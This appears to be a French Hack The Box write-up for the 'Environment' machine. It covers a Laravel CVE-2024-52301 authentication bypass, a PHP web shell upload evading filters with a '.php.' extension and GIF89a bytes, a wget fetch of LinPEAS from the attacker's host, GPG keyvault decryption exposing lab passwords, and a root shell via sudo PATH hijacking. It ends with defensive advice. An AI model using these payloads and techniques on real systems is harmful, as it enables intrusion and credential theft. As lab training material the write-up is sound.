@@ -1,0 +1,436 @@
+---
+title: "Environment - Hack The Box"
+date: "2025-08-25"
+tags: ["privilege-escalation", "sudo-exploit", "gpg"]
+draft: false
+summary: >-
+  Machine Linux de niveau Medium sur HTB exploitant la CVE-2024-52301 pour contournement d'authentification Laravel,
+  upload de fichiers malveillants, déchiffrement GPG et escalation de privilèges via manipulation PATH.
+images:
+  - /static/images/environment/logo.png
+---
+
+# Environment - HTB Machine
+
+## Introduction
+
+Environment est une machine Linux de niveau Medium sur Hack The Box qui illustre parfaitement comment les vulnérabilités récentes se combinent avec des erreurs de configuration classiques pour créer des chaînes d'attaque redoutables. Cette exploitation repose principalement sur la CVE-2024-52301 (manipulation d'environnement Laravel) et culmine avec une escalation de privilèges via une configuration sudo vulnérable.
+
+---
+
+## Reconnaissance et énumération
+
+### Scan de ports avec Nmap
+
+```bash
+nmap -sC -sV -O 10.10.11.67
+```
+
+**Résultats :**
+
+- Port 22/tcp : OpenSSH 8.4p1 (Debian)
+- Port 80/tcp : nginx 1.22.1
+
+Profil typique d'une application web avec accès SSH. La priorité se porte naturellement sur l'énumération web.
+
+### Découverte de contenu web
+
+```bash
+gobuster dir -u http://environment.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+**Endpoints significatifs découverts :**
+
+- `/login` (302) - Page de connexion Laravel
+- `/mailing` (405) - Endpoint de mailing list
+- `/upload` (405) - Fonctionnalité d'upload
+- `/management` (302) - Interface d'administration
+
+L'application révèle rapidement sa nature Laravel : structure des routes typique, messages d'erreur caractéristiques et tokens CSRF présents.
+
+---
+
+## Exploitation de la CVE-2024-52301
+
+### Découverte de la vulnérabilité
+
+Lors de l'analyse manuelle, un paramètre GET inhabituel attire l'attention. Les tests révèlent une manipulation d'environnement Laravel :
+
+```bash
+curl "http://environment.htb?--env=production"    # Footer: "Production v1.1"
+curl "http://environment.htb?--env=local"         # Footer: "Local v1.1"
+curl "http://environment.htb?--env=development"   # Footer: "Development v1.1"
+curl "http://environment.htb?--env=preprod"       # Footer: "Preprod v1.1"
+```
+
+Ce comportement confirme la presence de la CVE-2024-52301, permettant de modifier l'environnement d'execution Laravel via parametre GET.
+
+### Exploitation critique : contournement d'authentification
+
+L'environnement `preprod` revele une configuration dangereuse :
+
+```bash
+curl -L "http://environment.htb/upload?--env=preprod"
+```
+
+<Image
+  src="/static/images/environment/burp_preprod.png"
+  alt="requete burp accès dashboard"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+**Resultat :** Redirection vers `/management/dashboard` - acces administrateur sans authentification !
+
+<Image
+  src="/static/images/environment/dashboard.png"
+  alt="Dashboard"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+---
+
+## Interface d'administration et collecte d'informations
+
+### Enumeration de l'interface admin
+
+L'interface revele plusieurs fonctionnalites critiques :
+
+- Dashboard avec liste des abonnés mailing
+- Profil utilisateur (Hish - hish@environment.htb)
+- Avec ?--env=preprod -> **PHP Info** - Section particulièrement sensible
+
+<Image
+  src="/static/images/environment/php_info.png"
+  alt="Php info sur dashboard"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+- Fonctionnalité d'upload de photo de profil
+
+### Exposition d'informations via PHP Info
+
+```
+http://environment.htb/management/info?--env=preprod
+```
+
+<Image
+  src="/static/images/environment/config_php.png"
+  alt="Configuration Php info"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+**Informations critiques récupérées :**
+
+- **APP_KEY Laravel :** `base64:BRhzmLIuAh9UG8xXCPuv0nU799gvdh49VjFDvETwY6k=`
+- Configuration complète PHP/Laravel
+- Chemins système : `/var/www/app/public/`
+- DB_CONNECTION: sqlite (base locale)
+
+L'APP_KEY Laravel ouvre potentiellement la porte aux attaques de forge de cookies et de désérialisation.
+
+---
+
+## Exploitation de l'upload de fichiers
+
+### Analyse des restrictions
+
+L'endpoint `/upload` (POST multipart/form-data) stocke les fichiers dans `/storage/files/` mais implémente des validations.
+
+### Contournement des filtres
+
+**Tentatives échouées :**
+
+```bash
+# Upload PHP direct - ÉCHEC
+filename="shell.php"
+Content-Type: image/jpeg
+<?php system($_GET['cmd']); ?>
+# Resultat : {"error":{"message":"Invalid file detected"}}
+
+# Magic bytes simples - ÉCHEC
+filename="shell.php"
+Content-Type: image/jpeg
+GIF89a
+<?php system($_GET['cmd']); ?>
+# Resultat : {"error":{"message":"Invalid file detected"}}
+```
+
+**Contournement réussi : extension avec point final + Magic bytes**
+
+```bash
+# Extension avec point final
+filename="123.php."
+Content-Type: image/jpeg
+GIF89a
+<?php system($_GET['cmd']); ?>
+```
+
+**Résultat :** Upload réussi, fichier créé comme `123.php`, exécution PHP fonctionnelle !
+
+Le serveur supprime automatiquement le point final lors du stockage, contournant ainsi les validations d'extension.
+
+### Validation de l'exécution de code
+
+```bash
+curl "http://environment.htb/storage/files/123.php?cmd=whoami"
+# Résultat : www-data
+```
+
+RCE confirmé avec utilisateur `www-data`.
+
+---
+
+## Énumération système et escalation utilisateur
+
+### Déploiement de LinPEAS
+
+```bash
+# Transfert et exécution
+wget http://10.10.14.161:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+./linpeas.sh > /tmp/linpeas_output.txt
+```
+
+### Découvertes critiques
+
+**LinPEAS révèle plusieurs éléments intéressants :**
+
+1. **Base de données SQLite :** `/var/www/app/database/database.sqlite`
+2. **Fichiers GPG :** `/home/hish/backup/keyvault.gpg` et répertoire `.gnupg` accessible
+3. **Binaire SUID suspect :** `/tmp/bash` (faux positif)
+
+### Extraction des hachages utilisateurs
+
+```bash
+sqlite3 /var/www/app/database/database.sqlite
+.tables
+SELECT * FROM users;
+```
+
+**Hachages bcrypt récupérés :**
+
+```
+1|Hish|hish@environment.htb||$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi|
+2|Jono|jono@environment.htb||$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm|
+3|Bethany|bethany@environment.htb||$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.|
+```
+
+Les tentatives de cracking avec hashcat et john échouent dans des délais raisonnables (coût bcrypt 12).
+
+---
+
+## Exploitation des fichiers GPG
+
+### Problème d'accès initial
+
+```bash
+gpg --homedir /home/hish/.gnupg --decrypt /home/hish/backup/keyvault.gpg
+# Erreur : WARNING: unsafe ownership on homedir, Permission denied
+```
+
+GPG refuse d'utiliser un homedir appartenant à un autre utilisateur.
+
+### Contournement par copie des clés
+
+```bash
+# Création d'un environnement GPG contrôlé
+mkdir /tmp/gpg_hish
+chmod 700 /tmp/gpg_hish
+cp -r /home/hish/.gnupg/* /tmp/gpg_hish/ 2>/dev/null
+chmod 600 /tmp/gpg_hish/private-keys-v1.d/*
+chmod 644 /tmp/gpg_hish/pubring.kbx
+
+# Copie et déchiffrement
+cp /home/hish/backup/keyvault.gpg /tmp/
+gpg --homedir /tmp/gpg_hish --decrypt /tmp/keyvault.gpg
+```
+
+### Succès : récupération du trousseau
+
+```
+gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
+      "hish_ <hish@environment.htb>"
+PAYPAL.COM -> Ihaves0meMon$yhere123
+ENVIRONMENT.HTB -> marineSPm@ster!!
+FACEBOOK.COM -> summerSunnyB3ACH!!
+```
+
+Le fichier keyvault.gpg contenait un trousseau de mots de passe incluant celui du système local ! -> `marineSPm@ster!!`
+
+---
+
+## Escalation vers root
+
+### Authentification utilisateur via SSH
+
+```bash
+ssh hish@10.10.11.67
+# Mot de passe : marineSPm@ster!!
+```
+
+Accès réussi au compte `hish`.
+
+**Récupération du flag utilisateur :**
+
+```
+cat user.txt
+5d2c************************da78
+```
+
+### Énumération des privilèges sudo
+
+```bash
+sudo -l
+```
+
+**Configuration critique découverte :**
+
+```
+User hish may run the following commands on environment:
+    (ALL) /usr/bin/systeminfo
+```
+
+L'utilisateur peut exécuter `/usr/bin/systeminfo` en tant que root.
+
+### Analyse du script systeminfo
+
+```bash
+cat /usr/bin/systeminfo
+```
+
+**Contenu du script bash :**
+
+```bash
+#!/bin/bash
+echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
+dmesg | tail -n 10
+echo -e "\n### Checking system-wide open ports ###"
+ss -antlp
+echo -e "\n### Displaying information about all mounted filesystems ###"
+mount | column -t
+# ... autres commandes sans chemins absolus
+```
+
+### Exploitation via manipulation PATH
+
+Le script utilise des commandes sans chemins absolus, permettant l'exploitation via PATH.
+
+**Exploitation réussie :**
+
+```bash
+mkdir /tmp/exploit
+cd /tmp/exploit
+echo '#!/bin/bash' > dmesg
+echo '/bin/bash' >> dmesg
+chmod +x dmesg
+export PATH=/tmp/exploit:$PATH
+sudo /usr/bin/systeminfo
+```
+
+**Shell root obtenu immédiatement et récupération du flag !**
+
+```bash
+cat /root/root.txt
+48bc***********************ecc32
+```
+
+---
+
+## Analyse technique des vulnérabilités
+
+### CVE-2024-52301 : Manipulation d'environnement Laravel
+
+Cette vulnérabilité récente permet de modifier l'environnement d'exécution Laravel via paramètres GET, causant :
+
+- Contournement d'authentification en mode `preprod`
+- Exposition de l'APP_KEY Laravel
+- Accès administrateur non autorisé
+
+### Upload de fichiers non sécurisé
+
+**Technique de contournement identifiée :**
+
+- Extension `.php.` interprétée comme `.php` après suppression du point final
+- Magic bytes `GIF89a` pour contourner la validation MIME
+- Stockage dans répertoire web directement accessible
+
+### Configuration sudo dangereuse
+
+**Défauts critiques :**
+
+- Script bash exécutable en tant que root
+- Utilisation de commandes sans chemins absolus
+- Aucune validation des chemins d'exécution
+- Possibilité de manipulation du PATH
+
+---
+
+## Chaîne d'attaque complète
+
+1. **CVE-2024-52301** → Accès interface admin sans authentification
+2. **Upload malveillant** → RCE en tant que www-data
+3. **Énumération SQLite** → Hachages utilisateurs (échec cracking)
+4. **Exploitation GPG** → Trousseau de mots de passe système
+5. **Authentification SSH** → Accès utilisateur hish
+6. **Exploitation sudo** → Shell root via manipulation PATH
+
+---
+
+## Outils utilisés
+
+**Reconnaissance :**
+
+- Nmap (énumération ports)
+- Gobuster (découverte contenu)
+- curl (tests manuels)
+
+**Exploitation :**
+
+- Burp Suite (manipulation requêtes upload)
+- LinPEAS (énumération système automatisée)
+- GPG (déchiffrement trousseau)
+- SQLite3 (extraction base de données)
+
+**Échecs instructifs :**
+
+- Hashcat/John (bcrypt coût 12 trop élevé)
+- Binaire SUID `/tmp/bash` (faux positif LinPEAS)
+
+---
+
+## Recommandations défensives
+
+### Corrections immédiates
+
+- **Mise à jour Laravel** pour corriger CVE-2024-52301
+- **Durcissement upload** : validation côté serveur stricte, sandboxing
+- **Configuration sudo** : utilisation exclusive de chemins absolus
+- **Permissions GPG** : isolation des répertoires utilisateurs
+
+### Mesures de sécurité générales
+
+- Monitoring des accès aux ressources sensibles (.env, bases)
+- Audit régulier des configurations sudo
+- Segmentation des environnements (dev/prod/preprod)
+- Chiffrement des secrets avec gestionnaire de mots de passe dédié
+
+---
+
+## Conclusion
+
+Environment démontre parfaitement comment une CVE récente (2024-52301) peut se combiner avec des erreurs de configuration traditionnelles pour créer une chaîne d'attaque particulièrement efficace. Cette machine enseigne l'importance de :
+
+- La veille sécuritaire sur les CVE récentes
+- L'énumération automatisée approfondie (LinPEAS)
+- L'investigation des fichiers chiffrés comme sources d'informations
+- La validation rigoureuse des configurations sudo
+
+L'exploitation complète illustre comment les attaquants modernes enchaînent méthodiquement les vulnérabilités pour parvenir à leurs fins, soulignant l'importance d'une approche de sécurité multicouche et de la surveillance continue des systèmes.
